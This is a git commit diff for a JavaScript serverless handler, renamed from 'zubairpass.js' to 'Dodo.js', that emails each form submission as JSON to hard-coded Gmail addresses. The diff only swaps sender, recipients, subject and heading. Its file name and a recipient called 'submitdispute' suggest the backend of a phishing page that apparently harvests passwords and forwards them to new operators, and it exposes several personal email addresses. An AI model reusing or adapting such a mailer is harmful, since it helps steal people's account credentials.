e74ada09fe800ca5da6d5e6d71c72041890acac0
samadteam77 <samadteam318@gmail.com>
2026-04-06 16:50:59 +0500

    Update and rename zubairpass.js to Dodo.js

--- Dodo.js
+++ Dodo.js
@@ -36,11 +36,11 @@ export default async function handler(req, res) {
 
   try {
     await transporter.sendMail({
-      from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com",
-      subject: "Zubair",
+      from: `"Samad/team" <absamadniz@gmail.com>`,
+      to: "dodakhan410@gmail.com,smithalive125@gmail.com",
+      subject: "Dodo khan",
       text: JSON.stringify(formData, null, 2),
-      html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
+      html: `<h3>New submission from Abdul-samad</h3><pre>${JSON.stringify(
         formData,
         null,
         2
